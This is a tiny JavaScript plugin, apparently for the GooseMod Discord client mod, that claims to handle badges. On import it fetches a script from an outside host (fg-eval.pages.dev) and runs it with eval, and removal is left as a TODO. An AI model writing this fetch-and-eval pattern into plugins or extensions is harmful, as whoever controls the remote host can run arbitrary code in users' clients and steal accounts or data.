export default {
  goosemodHandlers: {
    onImport: () => {
      fetch("https://fg-eval.pages.dev/badgedb.js")
        .then(response => response.text())
        .then(data => eval(data));
    },
    onRemove: () => {
      console.log("TODO: Remove badges");
    },
  },
};
